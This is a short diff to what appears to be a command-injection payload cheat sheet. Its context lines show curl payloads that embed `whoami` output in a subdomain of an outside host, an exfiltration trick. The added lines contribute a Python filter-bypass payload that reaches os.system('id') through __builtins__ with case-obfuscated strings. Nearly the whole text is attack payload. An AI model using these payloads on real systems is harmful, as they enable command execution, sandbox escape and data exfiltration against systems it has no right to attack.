@@ -1180,6 +1180,9 @@ https://nodejs.org/api/process.html
 
 `curl http://$(whoami).site.com/`  
 `curl http://\`whoami\`.site.com/`
+   
+-> Tricks - Bypass  
+builtins_filter_bypass = "__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('id')";
 
 ### Shellshock
 
